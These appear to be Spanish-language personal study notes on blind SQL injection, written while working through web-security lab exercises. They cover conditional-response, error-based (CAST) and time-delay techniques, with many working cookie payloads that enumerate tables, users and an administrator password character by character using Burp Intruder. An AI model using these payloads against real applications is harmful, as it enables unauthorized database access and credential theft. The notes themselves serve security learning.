#Blind SQL Injection
La inyección ciega de SQL ocurre cuando una aplicación es vulnerable a la inyección de SQL
- Sus respuestas HTTP no contienen los resultados de la consulta SQL relevante ni los detalles de ningún error de la base de datos
- Muchas técnicas, como los ataques UNION, no son efectivas con las vulnerabilidades de inyección SQL ciega ( Blind SQL). **Esto se debe a que dependen de poder ver los resultados de la consulta inyectada dentro de las respuestas de la aplicación.**
- Todavía es posible explotar la inyección SQL ciega para acceder a datos no autorizados, pero se deben utilizar técnicas diferentes.

## Explotando Inyecciones ciegas con activando respuestas condicionales Exploiting blind SQL injection by triggering conditional responses

Considere una aplicación que utiliza cookies de seguimiento para recopilar análisis sobre el uso. Las solicitudes a la aplicación incluyen un encabezado de cookie como este:
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```
Cuando se procesa una solicitud que contiene una cookie ```TrackingId```, la aplicación utiliza una consulta SQL para determinar si se trata de un usuario conocido:
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Esta consulta es vulnerable a la inyección SQL, pero **los resultados de la consulta no se devuelven al usuario. Sin embargo, la aplicación se comporta de manera diferente dependiendo de si la consulta devuelve algún dato. Si envía un ```TrackingId``` reconocido, la consulta devuelve datos y recibe un mensaje de "Bienvenido" en la respuesta.** Este comportamiento es suficiente para poder explotar la vulnerabilidad de inyección SQL ciega. Puede recuperar información activando diferentes respuestas de forma condicional, dependiendo de la condición inyectada. Para comprender cómo funciona este exploit, supongamos que se envían dos solicitudes que contienen a su vez los siguientes valores de cookie  ```TrackingId```:
```
…xyz' AND '1'='1 -El primero de estos valores hace que la consulta devuelva resultados, porque la condición AND '1'='1 inyectada es verdadera. Como resultado, se muestra el mensaje "Bienvenido de nuevo".
…xyz' AND '1'='2 -El segundo valor hace que la consulta no devuelva ningún resultado porque la condición inyectada es falsa. El mensaje "Bienvenido de nuevo" no se muestra.
```
Esto nos permite determinar la respuesta a cualquier condición inyectada y extraer datos pieza por pieza.

Por ejemplo, supongamos que hay una tabla llamada ```Users``` con las columnas ```Username ``` y ```Passwords ```, y un usuario llamado ``` Administrator```. Puede determinar la contraseña de este usuario enviando una serie de entradas para probar la contraseña, un carácter a la vez. Para hacer esto, comience con la siguiente entrada:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm

xyz es el trackingID, esto funciona si la contraseña esta almacenada en claro y no el HASH
```

Esto devuelve el mensaje "Bienvenido nuevamente", que indica que la condición inyectada es verdadera y, por lo tanto, el primer carácter de la contraseña es mayor que m.
A continuación, enviamos la siguiente entrada:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
Esto no devuelve el mensaje "Bienvenido", lo que indica que la condición inyectada es falsa y, por lo tanto, el primer carácter de la contraseña no es mayor que t.

Finalmente, enviamos la siguiente entrada, que devuelve el mensaje "Bienvenido", confirmando así que el primer carácter de la contraseña es s:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

Podemos continuar este proceso para determinar sistemáticamente la contraseña completa para el usuario Administrador.
```
SUBSTRING(string, start, length)

Es importante conocer como funciona el subtring - SUBSTRING(string, start, length)
string - la cadena de texto
start - El inicio de la cadena
length - el tamaño de la cadena 

¿Como se puede averigurar el tamaño de la cadena?
EN MS SQL SELECT LEN (string)

Ejemplificando la info anterior

xyz' AND LEN(SELECT Password FROM Users WHERE Username = 'Administrator')) > 10
xyz' AND LEN(SELECT Password FROM Users WHERE Username = 'Administrator')) < 20
xyz' AND LEN(SELECT Password FROM Users WHERE Username = 'Administrator')) = 15

```
### Laboratio  Blind SQL

Esta práctica de laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada. Los resultados de la consulta SQL no se devuelven y no se muestran mensajes de error. Pero la aplicación incluye un mensaje de "Bienvenido" en la página si la consulta devuelve alguna fila. La base de datos contiene una tabla diferente llamada usuarios, con columnas llamadas nombre de usuario y contraseña. Debe aprovechar la vulnerabilidad de inyección SQL ciega para descubrir la contraseña del usuario administrador. Para resolver la práctica de laboratorio, inicie sesión como usuario administrador.

```
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
Voy a intentar con BURP SUITE

00) LO INTENTE EN EL GET Y NO VI NADA SIGNIFICATIVO
00) LO INTENTE EN LA COOKIE Y NADA -- sI ES EN LA COOKIE EL WELCOMEBACK DESAPARECE

0) LA INYECCION LA INTENTARE DIRECTAMENTE EN LA COOKIE
- Es en la cookie
- El Mensaje de Welcome desaparece

Cookie: TrackingId=DyF31dkSZiKVIINI'+AND+'1'='2';

1) VERIFICAR COMO SE COMPORTA CON ALGO VERDADERO

Cookie: TrackingId=DyF31dkSZiKVIINI'+AND+'1'='1'; 
El mensaje de WELCOME se manttiene
2) VERIFICAR COMO SE COMPORTA CON ALGO VERDADERO
El mensaje de WELCOME desaparece

Cookie: TrackingId=DyF31dkSZiKVIINI'+AND+'1'='2';

3) Dice que es una tabla llamada users pero diferente es decir como un user97238s

3.0)
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

Cookie: TrackingId=DyF31dkSZiKVIINI'+AND+'1'='2;


¿Cómo saber el nombre de la tabla? - EN el UNION tenemos esa info, pero es la unica forma?
¿Cómo saber la base de datos? - Suena cañon, es listar el esquema paso a paso
¿Hay alguna forma automatizada? -

Consulta base: xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
Consulta base: xyz' AND LEN(SELECT Password FROM users WHERE Username = 'Administrator')) = 15

3.1) Identificador Manejador, no es necesario todo el nombre
3.2) Aventarme directamente a la tabla

SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'-- // ESTE FILTRA Y PONE SOLO LAS TABLAS CREADAS POR EL USUARIO

SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'--

CustomerName LIKE 'a%'; // COmando para buscar coincidencias

LEN (SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' AND table_name LIKE 'users%') > 0 // NECESITAMOS PRIMERO EL LEN, AQUI CONFIRMAMOS QUE ES POSGRES Y QUE SI EXISTE UNA TABLA 
SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' AND table_name LIKE 'users%'--  CONSULTA POSTGRESQL PARA CONOCER SI EXISTE UNA TABLA QUE INICIE CON STARTS

RESULTADO: users_xrkoxi

PASO 5 IDENTIFICAR LAS COLUMNAS

SELECT column_name,data_type FROM information_schema.columns WHERE table_name = 'users_xrkoxi'-- // OBTIENE LAS COLUMNAS DE LA TABLA

##Reinici el laboratio
1 Se debe confirmar la inyección de SQL Blind
Con el verdadero y el falgo
La consulta base imaginaria sera
SELECT TRACKINGID FROM TACKINGTABLE WHERE TRACKINGID ='xyz'

SELECT TRACKINGID FROM TACKINGTABLE WHERE TRACKINGID ='xyz' AND 1=1 --
LA INYECCIÓN SERA: ' AND 1=1 --
TEN ENCUENTA EL '  porque en el codigo se en el que se genero la aplciación lleva '' de tal manera que cuando lo ingresas de manera manual debes omitir el del final

2 CONFIRMAR LA TABLA DE USUARIOS
AND (SELECT 'x' from users limit 1)='x' -> se confirmo la tabla

3 confimar usuario administrador

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
TrackingId=xyz' AND (SELECT username FROM users WHERE username='administrator')='administrator
Se confirma el usuario administrador

4 enumerar la contraseña

TrackingId=xyz' AND (SELECT password FROM users WHERE username='administrator')='administrator
TrackingId=xyz' AND (SELECT x FROM users WHERE username='administrator' and LENGTH(password )>1)='x

Se busca a traves de intruder que se automatiza la consulta
$ significa el valor que va a tomar intruder en el payload de numbero de 1 a 25, step 1
TrackingId=xyz' AND (SELECT x FROM users WHERE username='administrator' and LENGTH(password )=$1$)='x

el lenght que cambia el la respuesta correcta aunque tambien se puede filtrar la respuesta pero solo en la version PRO

para enumerar los caracteres de la contraseña
TrackingId=xyz' AND (SELECT substring (password,1,1) x FROM users WHERE username='administrator')='a'--

TrackingId=xyz' AND (SELECT substring (password,1,1) x FROM users WHERE username='administrator')='a'--
inicio en 0 la mia
040pgaz1eejq1swbf6n
0403pgaz1e8jq1swbf6n

0
1 0
2 4
3 0
5 p
6 g
7 a
8 z
9 1
10 e
12 j
13 q
14 1
15 s
16 w
17 b
18 f
19 6
20 n

```

#Inyeccion Basada en Errores
La inyección SQL basada en errores se refiere a casos en los que se pueden usar mensajes de error para extraer o inferir datos confidenciales de la base de datos, incluso en contextos ciegos. Las posibilidades dependen de la configuración de la base de datos y de los tipos de errores que se pueden generar:

- Generando expresiones que devuelvan verdadero o falso para obtener más información, los mismo de 1=1 ó 1=2
- Generando errores para ibservar si cuento con el control de los errores o generar mensaje que puedan describir la BD, ejemplo 1/0
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

Sintasix de case en SQL

CASE
    WHEN condition1 THEN result1
    WHEN condition2 THEN result2
    WHEN conditionN THEN resultN
    ELSE result
END;

SELECT CustomerName, City, Country
FROM Customers
ORDER BY
(CASE
    WHEN City IS NULL THEN Country
    ELSE City
END);

SELECT OrderID, Quantity,
CASE
    WHEN Quantity > 30 THEN 'The quantity is greater than 30'
    WHEN Quantity = 30 THEN 'The quantity is 30'
    ELSE 'The quantity is under 30'
END AS QuantityText
FROM OrderDetails;
```

Procedimiento
```
SELECT TrackingId  FROM tracking WHERE ID = 'TrackingId'

2.- SELECT TrackingId  FROM tracking WHERE ID = 'TrackingId'' -> ERROR DE SINTAXIS
3.- SELECT TrackingId  FROM tracking WHERE ID = 'TrackingId''' -> '' SE PUEDE VER COMO UN NULL
4.- SELECT TrackingId  FROM tracking WHERE ID = 'TrackingId=xyz'||(SELECT '')||'' -> '' CONCATENA UN SELECT VACIO, 1) VERIFICA QUE LA ENTRADA SE ESTA ENVIANDO DIRECTAMENTE A LA BASE DE DATOS  2) IDENTIFICA EL COMPORTAMIENTO
```
1. Entrar al sitio
2. Añadir una comilla simple y verificar el mensaje de error `TrackingId=xyz'` > dara un mensaje de error de sintaxis
3. Ahora añadir 2 comillas `TrackingId=xyz''` > no mandará error
4. Confirmar inyeccion SQL  `TrackingId=xyz'||(SELECT '')||'` > Si ejecuta el comando confirma que se pueden realizar subconsultas por lo tanto es vulnerable, además de que no altera información
5. No funciono por lo tantoa la sintaxis puede ser erroronea, se intenta con la sintais de Oracle `TrackingId=xyz'||(SELECT '' FROM dual)||'`

## Extraer datos sensibles a traves de verbose de mensaje de error de SQL

La desconfiguración de la base de datos a veces resulta en mensajes de error verbós. Estos pueden proporcionar información que puede ser útil para un atacante. Por ejemplo, considere el siguiente mensaje de error, que se produce después de inyectar una sola cita en un idparámetro:
` Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char `

Ocasionalmente, puede ser capaz de inducir la aplicación para generar un mensaje de error que contiene algunos de los datos que es devueltos por la consulta. Esto convierte efectivamente una vulnerabilidad de inyección SQL persiana en una visible.
Puedes usar el CAST()función para lograrlo. Le permite convertir un tipo de datos a otro. Por ejemplo, imagine una consulta que contenga la siguiente declaración:
`CAST((SELECT example_column FROM example_table) AS int)`
CAST o CONVERT, convierten una entrada en otro tipo de datos, leyendo se dice que la base de datos hace conversiones de datos implecitas (automatico) y explicitas(que tiene que ser declaradas), entonces por defecto existe una conversión previo a marcar un error, sin embargo la intención es la conversión para que en el error se muestra la información sensible

La respuesta de la consulta anterior seria: <br>
ERROR: invalid input syntax for type integer: "Example data"

EL laboratorio dice que una tabla users username password y que hay que obtener la contraseña de administrador 
```
Otro laboratorio a modo, es decir que quizás no es tan realizasta o muy simple

Primero la cookie de siempre - esta bien
Despues identificar los errores de sintaxis
- Comilla simple - esta bien marca error y muesta la consulta Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'||CAST((SELECT password FROM users WHERE us'. Expected  char
SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'||CAST((SELECT password FROM users WHERE us'

- Comilla doble - esta bien no marca error ni otro comporatmiento

- Se hace la prueba de una concatenación de simple
||(Select '')|| No hay error
||(Select NULL)|| No hay error
||(Select NULL, NULL)|| Hay error, solo se esta devolviendo un parametro

- Se realiza la consulta
||(SELECT username FROM users  WHERE username= 'administrator')|| manda error de maximo 96 caracteres, y recorta en el where
--Se recorta el trackid y no regresa ningun dato, es por eso que se necesita el cast para ver la respuesta

fGR'||CAST((SELECT username FROM users limit 1) AS int)||'
fGR'||CAST((SELECT password FROM users limit 1) AS int)||'

                   </header>
                    <h4>ERROR: invalid input syntax for type integer: "trkdcuy3937qpi8w2j9g"</h4>
                    <p class=is-warning>ERROR: invalid input syntax for type integer: "trkdcuy3937qpi8w2j9g"

Realmente solo habia un usuario o era el primero y por eso se pudo consultar la información, además aquí hay un problema más importante el limite de caracteres

Procedimiento oficial
Consulta base  SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx''
Error comilla simple
TrackingId=ogAZZfxtOKUELbuJ'

Enviar un comentario
TrackingId=ogAZZfxtOKUELbuJ'--
TrackingId=ogAZZfxtOKUELbuJ'--'

Dado que no hay una respuesta va directamente al cast y no lo concateno, lo hizo con un AND
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--

Dado que espera un valor booleano marca primero ese error que el del cast por lo que cambia la sentencia a
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)-- => No hay error por lo que sintacticamente valido

Comienza con la consultas relevantes
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
EL error se puede observar que esta trunkada la cadena de texto, por lo que hay un limite de caracteres
Elimina el valor de la cookie o tracking ID para tener mas caracteres en la consulta 

TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)-- =>Elimino todo el tracking ID
El error ahora es porque devuelve multiples filas y solo espera una con solo un campo
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
Ahora muestra información sensible TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

Y la solución TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

```
# SQL Blind desencadenando retrasos de tiempo
Cuando una aplicación detecta error de la base de datos y los maneja de manera adecuada no se vará ningún tipo de respuesta, esto hace que las técnicas anteriores no sean tan significativas.
Lo que se puede realizar ahora es que en lugar de desencadenar errores, se hará desencadenar retrasos de tiempo, dependiendo la condicion inyectada

Las técnicas para desencadenar un retraso en el tiempo son específicas del tipo de base de datos que se utiliza. Por ejemplo, en Microsoft SQL Server, puede utilizar el siguiente para probar una condición y desencadenar un retraso dependiendo de si la expresión es verdadera:
```
'; IF (1=2) WAITFOR DELAY '0:0:10'-- =>La primera de estas entradas no desencadena un retraso, porque la condición 1=2es falso.
'; IF (1=1) WAITFOR DELAY '0:0:10'-- =>La segunda entrada desencadena un retraso de 10 segundos, porque la condición 1=1es cierto
```
Using this technique, we can retrieve data by testing one character at a time: 
`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

## Laboratorio 1 SQL Injection with time delays
```
Dice que debemos generar un injeción que cause un delay de 10 segundos y que esta en cookie

select dbms_pipe.receive_message(('a'),10) from dual;
Consulta base  SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'
SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'

SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx';select dbms_pipe.receive_message(('a'),10) from dual;--''
';select dbms_pipe.receive_message(('a'),10) from dual;--'

SELECT * FROM tracking WHERE id = '';WAITFOR DELAY '0:0:10'--''

SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx';SELECT pg_sleep(10);--''
SELECT pg_sleep(10)
||SELECT pg_sleep(10)||
'||pg_sleep(10)--
SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'||pg_sleep(10)--'

SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx';SELECT SLEEP(10);''
SELECT SLEEP(10)

Teniendo la consulta base
SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'

Por la siguiente consulta funciono:
SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'||pg_sleep(10)--'
Y estas no funcionaron:
SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx';SELECT pg_sleep(10);--''

el ; Indica que puede haber multiples consultas que puede estar filtradas o estar configuradas para que solo haya una consulta y no multiples
CTRL + U para conertir en URL encode
CTRL + Shift + U convertir a notación ASCCO

```
## Laboratorio 2
```
Tabla user usuarname password
obtener la contraseña administrador

```
# Hola
## HOLA
### HOLA
